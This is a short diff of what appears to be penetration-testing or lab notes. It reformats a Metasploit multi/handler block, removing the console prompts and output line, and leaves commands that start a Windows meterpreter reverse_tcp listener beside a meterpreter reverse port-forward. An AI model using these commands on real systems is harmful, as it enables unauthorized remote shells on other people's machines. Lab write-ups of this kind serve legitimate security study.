@@ -544,11 +544,10 @@ meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
 
 #### **Configuring and Running Listener (`multi/handler`)**
 ```bash
-msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) > set LPORT 8081
-msf6 exploit(multi/handler) > set LHOST 0.0.0.0
-msf6 exploit(multi/handler) > run
-[*] Started reverse TCP handler on 0.0.0.0:8081
+set payload windows/x64/meterpreter/reverse_tcp
+set LPORT 8081
+set LHOST 0.0.0.0
+run
 ```
 
 ---
